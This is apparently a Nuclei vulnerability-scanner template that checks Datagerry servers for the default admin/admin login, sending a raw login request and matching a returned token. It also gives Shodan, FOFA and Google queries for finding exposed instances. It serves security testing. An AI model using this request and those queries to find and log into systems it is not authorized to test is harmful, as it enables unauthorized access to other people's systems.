id: datagerry-default-login

info:
  name: Datagerry Default Credentials
  author: gy741
  severity: high
  description: Datagerry default login credentials were discovered.
  metadata:
    verified: true
    max-request: 1
    vendor: becon
    product: datagerry
    shodan-query: http.title:"datagerry"
    fofa-query: title="datagerry"
    google-query: intitle:"datagerry"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)datagerry"})
  tags: datagerry,default-login
variables:
  username: admin
  password: admin

http:
  - raw:
      - |
        POST /rest/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"user_name":"{{username}}","password":"{{password}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"token":'
          - '"token_issued_at":'
          - '"token_expire":'
        condition: and

      - type: word
        part: content_type
        words:
          - application/json

      - type: status
        status:
          - 200

